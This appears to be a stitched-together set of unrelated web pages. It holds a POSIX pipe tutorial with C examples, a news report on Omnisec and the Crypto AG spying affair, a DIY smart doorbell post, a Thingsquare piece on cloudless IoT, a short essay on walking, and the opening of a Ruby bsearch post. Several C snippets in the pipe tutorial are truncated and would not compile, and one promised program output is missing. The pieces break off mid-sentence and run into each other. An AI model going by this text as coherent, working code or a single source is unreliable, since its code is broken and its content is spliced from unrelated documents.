<p>The <code>pipe</code> function takes an array of two integers, and writes file descriptors
of the read and write end of the pipe into it upon successful return.
The <code>fildes[0]</code> file descriptor is opened for reading and <code>fildes[1]</code> for writing.
Some implementations of UNIX allow using the <code>fildes[0]</code> end for writing too and <code>fildes[1]</code> for reading
(the full duplex mode), but this behavior is unspecified by POSIX and it is only safe to assume that
they are unidirectional (half duplex mode).</p>

<p>The <code>pipe</code> call can fail and return <code>-1</code>, setting appropriate <code>errno</code>
if the process (<code>EMFILE</code>) or the system (<code>ENFILE</code>) expired the allowed number of
open file descriptors.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-in-process.svg" alt="pipe in a process"></p>

<p>This interface as it looks is appropriate only for processes that have the shared ancestor (usually the direct parent)
and is usually combined with <code>fork(2)</code>/<code>vfork(2)</code>/<code>posix_spawn(3)</code> or an equivalent interface
(otherwise the pipe would be a futile feature).
To workaround the limitation of having the shared predecessor,
the fifo special files or UNIX domain sockets can be used.</p>

<p>In the UNIX system, file descriptors are inherited by children by default (with some exceptions in modern APIs)
and thus the created pipe, referenced by the array of two file descriptors, connects the child and the parent.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork.svg" alt="pipe after fork"></p>

<p>In order to make the pipe effective, the user has to decide the direction of the data flow and
close the other ends. If the intention is to send data from process A to process B, then we need
to close the <code>fildes[0]</code> (reading) end in process A and <code>fildes[1]</code> (writing) end in process B.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-after-fork2.svg" alt="pipe after fork"></p>

<p>Now, the processes can transmit data over the pipe channel.</p>

<p>This algorithm is coded as follows:</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

{

			err(EXIT_FAILURE, <span>"close"</span>);
		read(fildes[<span>0</span>], <span>&amp;</span>c, <span>1</span>);
		printf(<span>"Received: %c</span><span>\n</span><span>"</span>, c);
		<span>/* force the buffer to be printed on the output (screen) */</span>
		fflush(stdout);
		_exit(<span>0</span>);
	}
	<span>/* parent */</span>
	<span>if</span> (close(fildes[<span>0</span>]) <span>==</span> <span>-</span><span>1</span>)

	<span>/* wait for the child process termination */</span>
	<span>if</span> (wait(<span>&amp;</span>status) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"wait"</span>);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>NB. For the sake of simplicity, certain code paths such as handling interrupts (<code>EINTR</code>) were omitted.</p>

<p>The execution of this program results with:</p>



<p>The UNIX designers put the following constraints on the pipes (assuming <code>O_NONBLOCK</code> not set):</p>

<ul>
<li>Once the readable end of the pipe is closed, any attempt done to write results with <code>SIGPIPE</code> emitted into the writing process.
A process can either be killed or catch or ignore the signal and then needs to handle the error (<code>-1</code> and errno set to <code>EPIPE</code>) manually.</li>
<li>Once the writable end of the pipe is closed, an attempt to read from the pipe returns <code>0</code> and notifes <code>EOF</code> on the file descriptor.</li>
</ul>

<p>Additionally:</p>

<ul>
<li>The amount of free space inside the pipe (kernel buffering) is limited and implementation specific.</li>
<li>When the child process starts, the default stdio I/O buffering on pipes defaults to the fully buffered mode.
The three basic approaches to workaround this are:

<ul>
<li>using <code>fflush(3)</code> explicitly,</li>
<li>changing the buffering mode (<code>setvbuf(3)</code>) or</li>
<li>using pseudo terminals if the child process is not modifiable.</li>
</ul></li>
</ul>

<h2 id="the-kernel-pipe-buffer-size">The kernel pipe buffer size</h2>

<p>The size of the kernel buffer storing the pipe data is limited and will cause further attempts to <code>write(2)</code> data to block
until the space is regained, by the <code>read(2)</code> operation on the other end.
The minimum acceptable value in a <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/limits.h.html">POSIX system</a>
is set to 512 bytes.</p>

<p>In order to check the maximum number of bytes that can be written atomically to a pipe, a programer can use the compiler constant <code>PIPE_BUF</code> or
the dynamic value <code>_PC_PIPE_BUF</code> passed to <code>pathconf(2)</code> or <code>fpathconf(2)</code>.
<code>pathconf(2)</code> and <code>fpathconf(2)</code> can be applied on:</p>

<ul>
<li>directories that can contain fifo files,</li>
<li>fifo files.</li>
</ul>

<p>Additionally, <code>fpathconf(2)</code> can be applied on the pipe file descriptor.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

	printf(<span>"PIPE_BUF: %d</span><span>\n</span><span>"</span>, PIPE_BUF);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>However, the real number is usually larger. It can be retrieved with <code>ioctl(FIONSPACE)</code> on NetBSD.
This feature is unavailable on other systems: FreeBSD, OpenBSD and Linux, thus FreeBSD implements
<code>FIONSPACE</code> for sockets, but not for pipes.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (ioctl(fildes[<span>1</span>], FIONSPACE, <span>&amp;</span>n) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"ioctl"</span>);
	printf(<span>"FIONSPACE fildes[1]: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>An alternative approach to check the maximum buffer size of the pipe feature is to count the
bytes writable into it manually, one by one, and to detect the hang.
This can be achieved for example with the <code>alarm(3)</code> call, unblocking the hang.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;signal.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>static</span> <span>int</span> n;

<span>static</span> <span>void</span>
<span>sighand</span>(<span>int</span> s)
{

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);
	exit(EXIT_SUCCESS);
}

<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (signal(SIGALRM, sighand) <span>==</span> SIG_ERR)
		err(EXIT_FAILURE, <span>"signal"</span>);

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	alarm(<span>5</span>); <span>/* arm the alarm to 5 seconds */</span>

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* if we ended up here, there was an error */</span>
	err(EXIT_FAILURE, <span>"write"</span>);
}</code></pre></div>

<p>Alternatively, one could set the pipe end in the non-blocking mode.
This can be achieved with
the <code>fcntl(2)</code> call and the <code>F_SETFL</code> + <code>O_NONBLOCK</code> arguments.</p>

<p>The <code>O_NONBLOCK</code> mode on pipes causes the following change:</p>

<ul>
<li>Writing into a full pipe buffer returns with <code>-1</code> and errno <code>EAGAIN</code>, instead of blocking.</li>
</ul>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>There are a few other kernel specific approaches to guess the maximum buffer size
that can be stored inside the kernel. One of them is to read <code>PIPE_SIZE</code> from <code>&lt;sys/pipe.h&gt;</code>
on BSD systems, but given that it is 16384 for FreeBSD, NetBSD and OpenBSD, it’s merely an
internal implementation specific header.</p>

<p>In order to make the picture fuller, we need to mention that the FreeBSD and NetBSD kernels
allow tuning of the pipe behavior and investigating
the kernel virtual address spent on the buffers.</p>

<p>FreeBSD provides the following <code>sysctl</code> knobs:</p>

<ul>
<li><code>kern.ipc.piperesizeallowed</code>: Pipe resizing allowed</li>
<li><code>kern.ipc.piperesizefail</code>: Pipe resize failures</li>
<li><code>kern.ipc.pipeallocfail</code>: Pipe allocation failures</li>
<li><code>kern.ipc.pipefragretry</code>: Pipe allocation retries due to fragmentation</li>
<li><code>kern.ipc.pipekva</code>: Pipe KVA usage</li>
<li><code>kern.ipc.maxpipekva</code>: Pipe KVA limit</li>
</ul>

<p>NetBSD:</p>

<ul>
<li><code>kern.pipe.maxbigpipes</code>: Maximum number of “big” pipes</li>
<li><code>kern.pipe.nbigpipes</code>: Number of “big” pipes</li>
<li><code>kern.pipe.kvasize</code>: Amount of kernel memory consumed by pipe buffers</li>
</ul>

<p>OpenBSD does not provide any similar <code>sysctl</code> functionality for pipes.</p>

<p>What are “big” pipes in NetBSD? They are special case pipes that exceed <code>PIPE_SIZE</code> …</p></div></div>

This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>

The whole project cost about $150 (USD), which is about average for a smart doorbell, but it is much more full-featured than anything else you’ll find on the market.

But it was my first electronic project that needed to <em>survive the elements</em>. To that end, I decided to use a <strong>junction box</strong> to house the electronics themselves.</p><p>The next requirement was also obvious: a <strong>button</strong>. However, the concern with such a unique design is that visitors need to intuitively understand <em>what the device is</em>. I decided upon a durable metal button that also lights up.

This is arguably the most important security camera in the entire house, and I didn’t have a lot of space in the junction box, so I splurged on a <strong>night-vision IR camera</strong> with a microphone built-in. Throw in a tiny USB speaker, and we have <strong>bi-directional audio</strong>.</p><p>The complete part list:</p><article><div><a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" title="Related: Turn Any Speaker into a Multi-Room Wireless Receiver" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 736px) 100vw, 736px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg.webp 1024w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-300x169.jpg.webp 300w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-768x432.jpg.webp 768w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1536x864.jpg.webp 1536w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-540x304.jpg.webp 540w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-344x194.jpg.webp 344w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1128x635.jpg.webp 1128w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1.jpg.webp 1920w"><img width="736" height="414" src="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg" alt="multi-room audio speakers snapcast" srcset="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-300x169.jpg 300w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-768x432.jpg 768w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-540x304.jpg 540w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-344x194.jpg 344w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1.jpg 1920w" sizes="(max-width: 736px) 100vw, 736px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x576.png" data-srcset="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-300x169.jpg 300w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-768x432.jpg 768w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-540x304.jpg 540w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-344x194.jpg 344w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1.jpg 1920w"></picture></a></div><div><div><div><a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" title="Related: Turn Any Speaker into a Multi-Room Wireless Receiver" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 300px) 100vw, 300px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png.webp 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png.webp 482w"><img width="300" height="103" src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" alt="" srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w" sizes="(max-width: 300px) 100vw, 300px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-300x103.png" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w"></picture></a></div><div><div><p>Building a multi-room home audio system begins by making "dumb speakers smart."

It also can detect which user pin code was used to open the door (and when) — great peace of mind when giving cleaners a code to the house.</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 947px) 100vw, 947px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png.webp 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png.webp 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png.webp 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png.webp 768w"><img src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" alt="home assistant motioneye camera" width="947" height="717" title="Home Assistant " srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w" sizes="(max-width: 947px) 100vw, 947px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-947x717.png" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w"></picture><figcaption>Home Assistant connects to MotionEye to show the camera, motion alerts, and other detections.</figcaption></figure><p>But, most importantly, it can be locked/unlocked with a tap in Home Assistant.</p><h2><span id="Source_Code_Recap"></span>Source Code: Recap<span></span></h2><p>I wish I could give you copy-and-paste code for this project, but a lot of it will depend on your exact hardware, speakers, cameras, etc. Instead, I’ll recap each piece involved and link to the articles/code where I explain how to implement them:</p><ul><li><a href="https://www.technicallywizardry.com/node-red-docker-kubernetes/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Node Red uses gpiod</a> to trigger a flow when GPIO #18 (the doorbell button) fires.</li><li>The <a href="https://www.technicallywizardry.com/loudspeaker-network-intercoms-alerts/" data-wpel-link="internal" rel="internal follow noopener noreferrer">loudspeaker alert flow plays a wav file</a>.</li><li>I have <a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" data-wpel-link="internal" rel="internal follow noopener noreferrer">multiple DIY speakers</a> that play the alert around the house.</li><li><a href="https://www.technicallywizardry.com/diy-dashcam-raspberry-pi-zero-w-motion-eye/" data-wpel-link="internal" rel="internal follow noopener noreferrer">MotionEye drives the camera</a>, capturing stills and videos.</li><li>The <a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" data-wpel-link="internal" rel="internal follow noopener noreferrer">CCTV Security Cameras</a> handle person/object detection.</li><li><a href="https://www.technicallywizardry.com/tag/home-assistant/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Home Assistant’s</a> Yale Lock integration allows us to lock/unlock.

<p>We are not alone in believing in the idea of a cloudless IoT. In the IoT community, the concept is often called <a href="https://en.wikipedia.org/wiki/Edge_computing" target="_blank">edge</a> or <a href="https://en.wikipedia.org/wiki/Fog_computing" target="_blank">fog</a> computing. There are entire software platforms, such as the <a href="https://litmusautomation.com/en/loopedge/" target="_blank">Litmus LoopEdge platform</a>, <a href="https://azure.microsoft.com/en-us/services/iot-edge/" target="_blank">Microsoft Azure Edge</a>, and the <a href="https://crosser.io/solutions/iot-edge-analytics/" target="_blank">Crosser IoT edge analytics suite</a>, that are built to run off the grid. There are even custom <a href="https://cloud.google.com/edge-tpu/" target="_blank">hardware chips</a> designed to support off-the-cloud computation, usually speech&nbsp;processing.</p>
<p>There also an old adage that <i>the Internet of things without the Internet is just … things</i>. This is not true: there are many situations where IoT systems without Internet can be as valuable as Internet-enabled IoT&nbsp;systems.</p>
<p>We at Thingsquare have built and deployed several cloudless IoT systems with the no-cloud version of our IoT platform,&nbsp;including:</p>
<ul>
<li><strong>Electrical generators</strong>. These are deployed in a remote location where there is little or no Internet&nbsp;access.</li>
<li><strong>Industrial machinery</strong>. These are deployed as a completely standalone product with a separate touch screen on the local&nbsp;controller.</li>
<li><strong>Industrial lighting</strong>. These are run in places where customers want a completely siloed&nbsp;system.</li>
</ul>

<p>But let’s first look at why we use the cloud at all. Because there are good reasons for doing&nbsp;so.</p>

<h2 id="why-iot-in-the-cloud-">Why IoT in the&nbsp;cloud?</h2>
<p>There are good reasons for why the backend logic of an IoT system is run in the&nbsp;cloud:</p>
<ul>
<li><strong>Data storage</strong>: The cloud can store an almost unlimited amount of&nbsp;data.</li>
<li><strong>Computation</strong>: Some mechanisms needs an abundance of computational power, which is something that the cloud can provide an almost unlimited amount&nbsp;of.</li>
<li><strong>Remote access</strong>: To provide users with remote access to the data generated by the IoT devices, or to control the devices themselves, you need to have a cloud service that connects the devices with their&nbsp;users.</li>
<li><strong>Access control</strong>: The cloud can provide effective access control mechanisms for your&nbsp;users.</li>
<li><strong>Data cross-referencing</strong>: To be able to run effective machine learning algorithms, you sometimes need access to a wide range of data. The cloud lets you collect data from more than one site to cross-reference and combine this&nbsp;data.</li>
<li><strong>Application integration</strong>: IoT systems rarely run on their own. Integration with other software systems is much easier if the backend is located in a single place: the&nbsp;cloud.</li>
<li><strong>Security updates</strong>: when the IoT backend is run in the cloud, a dedicated security team can keep track of and apply security updates as&nbsp;needed.</li>
</ul>
<p>These reasons, which are good reasons, are why most IoT systems today are provided through the cloud. Thingsquare is no&nbsp;exception.</p>
<p>The backend portion of the <a href="https://www.thingsquare.com/iot-platform/">Thingsquare IoT platform</a> is originally designed to be run in the cloud. Sometimes the backend is running on a typical cloud provider like Amazon Web Services, and sometimes the backend is installed on a hosted machine, as a traditional on-premise software&nbsp;package.</p>
<p>But the running the IoT backend in cloud does come with some&nbsp;drawbacks.</p>
<h2 id="why-cloudless-iot-">Why cloudless&nbsp;IoT?</h2>
<p>There are good reasons to not rely on an always-on cloud connection for every IoT&nbsp;project:</p>
<ul>
<li><strong>Stability</strong>: cloud services may go down so avoiding the cloud may therefore increase&nbsp;stability.</li>
<li><strong>Persistence</strong>: cloud services may go away so avoiding the cloud may allow the IoT system to run for ever, without relying on the hosting company to&nbsp;persist.</li>
<li><strong>Data privacy</strong>: sometimes data should not leave the location where it is&nbsp;generated.</li>
<li><strong>Security</strong>: fewer network connections means fewer attack&nbsp;vectors.</li>
<li><strong>Necessity</strong>: sometimes there just isn’t Internet&nbsp;access.</li>
</ul>
<p>Any cloud-based software may become unreachable if the cloud goes down. This can happen even for <a href="https://www.cbronline.com/news/google-cloud-down" target="_blank">companies like Google</a>, who arguably has state-of-the-art cloud infrastructures and one of the best cloud teams in the world. Any IoT solution that wholly depends on the cloud will suffer an outage if the cloud goes&nbsp;down.</p>
<p>Because the cloud service is a living thing, it may die. This can happen if the company that runs the service goes away or if it simply decides that it is no longer economical to keep it running. There are several <a href="https://hackaday.com/2019/11/14/best-buys-iot-goes-dark-leaving-some-smart-products-dumbfounded/">real-world</a> <a href="https://www.theverge.com/2016/4/4/11362928/google-nest-revolv-shutdown-smart-home-products">examples</a> of&nbsp;this.</p>
<p>But the most compelling reason to why use a cloudless IoT system is when Internet access is unavailable. At Thingsquare, we have been working with projects where the IoT system is deployed in rural Africa, where Internet access is spotty at best. And with projects in countries Internet access has been generally available, but where the IoT system has been inside a deep cellar where 4G access was&nbsp;impossible.</p>
<h2 id="the-challenges-of-cloudless-iot">The challenges of cloudless&nbsp;IoT</h2>
<p>Moving the IoT backend away from the cloud, closer to the IoT devices presents a number of&nbsp;challenges:</p>
<ul>
<li><strong>Authentication</strong>: authentication is significantly easier with the cloud, thanks to mechanisms such as 2 factor&nbsp;authentication.</li>
<li><strong>Remote access</strong>: providing remote access without the cloud is very difficult and in most cases&nbsp;impossible.</li>
<li><strong>Data processing</strong>: crunching numbers without having access to the abundance of storage and computation that the cloud provides is significantly&nbsp;harder.</li>
<li><strong>Software deployment</strong>: many IoT systems need data processing or similar mechanisms, and these systems are often designed to be run in the&nbsp;cloud.</li>
<li><strong>Software updates</strong>: software is a living thing and needs to be kept up to&nbsp;date.</li>
</ul>
<p>These issues result in trade-offs. Any IoT system that is deployed away from the cloud must be prepared to deal with&nbsp;them.</p>
<h2 id="a-practical-approach-to-a-cloudless-iot">A practical approach to a cloudless&nbsp;IoT</h2>
<p>Thingsquare takes a deliberately simple approach to the cloudless&nbsp;IoT:</p>
<ul>
<li>We run our IoT backend on a non-connected local&nbsp;controller</li>
<li>Deal with resulting the trade-offs on a case-by-case&nbsp;basis</li>
</ul>
<p>The local controller can run on a piece of hardware similar to a Raspberry Pi. The local controller is deployed on an on-site network and we provide a user interface over that network only. The user interface is accessible through a smartphone app, which can detect nearby local controllers via Bluetooth, and let users interact with&nbsp;devices.</p>
<p>The backend logic of the IoT application, which would normally run in the cloud, also runs on the local controller. This also means that the backend application must be scaled down to the limits of a Raspberry Pi-class&nbsp;device.</p>

</div>


<p>Since we cannot expect the local controller hardware to be as robust as a cloud host, particularly if the local controller is based on an <span>SD</span> drive, we limit disk writes by storing volatile data in memory. This means that software that runs on top of the API must be prepared to deal with having access to less&nbsp;data.</p>
<h3 id="user-authentication">User&nbsp;authentication</h3>
<p>To authenticate users, we use a two-tiered approach. The first tier is to leverage the existing access control to the local WiFi. If a user is authenticated to the local WiFi, this tier assumes that the user also should have access to the local controller and its devices. It is possible to configure the access level that such non-authenticated local users should&nbsp;have.</p>
<p>The second tier uses a hybrid approach: we use the cloud to authenticate the user and provide an access token to the local controller. The local controller announces its presence with encrypted Bluetooth beacons that the smartphone app uses to authenticate each user. This requires the users to have an account in the cloud. The app checks with the cloud server to match the encrypted beacon and the user account. If the user has access, the server responds with an access key to the local&nbsp;controller.</p>
<h3 id="device-authentication">Device&nbsp;authentication</h3>
<p>Device authentication is comparatively easier than user authentication, because devices can be preprogrammed with <span>TLS</span> certificates. We&nbsp;there</p>
<h3 id="software-delivery-with-a-git-repository">Software delivery with a git&nbsp;repository</h3>
<p>We deliver all software over a managed <a href="https://en.wikipedia.org/wiki/Git">git repository</a>. This repository can be updated by connecting the local controller to the Internet and requesting an update, or manually via a <span>USB</span>&nbsp;stick.</p>

<p>Signed firmware update files are included in the git repository. Devices may request updates from the local controller, just as they do when they are connected to a cloud&nbsp;backend.</p>
<p>Because we use the full IoT backend software, <a href="https://www.thingsquare.com/blog/articles/network-updates">full-network <span>OTA</span> updates</a> work as&nbsp;usual.</p>
<h3 id="user-interface">User&nbsp;interface</h3>
<p>The local controller may present a user interface with a touch screen physically connected to the controller, or over the WiFi to smartphone apps on the same network. By default, the user interface is implemented via <span>HTML5</span>/JS/CSS and is updated via the git&nbsp;repository.</p>
<h2 id="conclusions">Conclusions</h2>
<p>The cloud is an integral part of the Internet of Things. But there are situations in which the cloud is not the best&nbsp;choice.</p>
<p>Thingsquare provides a local, cloudless IoT solution, based on the same software that is backing our cloud-based offering, that solves the problems with software delivery, user interface access, and firmware updates for the cloudless&nbsp;IoT.</p>

<p>Every day I go for a 45-minute walk first thing in the morning. I’ve been doing it for almost two months now, I think. And it has become one of the most essential parts of my daily routine.</p>



<p>Walking awakens my mind and my body. It makes me feel energized, sharp and clear-headed. It helps me disentangle my thoughts, digest experiences and see unfamiliar patterns.&nbsp;</p>



<p>Maybe that’s why it’s so easy for me to write while I walk. Why it comes so naturally. I hate to admit it, but for some reason I struggle to write standing still. I need cadence. I need movement.</p>



<p>When I walk, my mind and my body move together. They ride and go along in unison, creating a feeling of immense tranquillity and equilibrium. Even when I’m witnessing dark or conflicting thoughts, it all flows smoothly.</p>



<p>I’ve always like walking. And I think I’ve also known for a while how much it helps me. Despite that, though, it was never a consistent habit. It was always occasional.</p>



<p>But now I seriously doubt I could go on with my life without doing it every day. I would go mad. Especially now that I call myself a creator.</p>



<p>Walking has become not just indispensable to my work and productivity, but also to my happiness and well-being — it is a form of self-care, even therapy.</p>


<p><em>This piece is part of a series of 30 atomic essays where I explore what it means to be a&nbsp;<a href="https://rationalcreatives.substack.com/" target="_blank" rel="noreferrer noopener">rational creative</a>&nbsp;and the different aspects of being a creator online.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>What’s the midpoint between 0 and infinity? Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
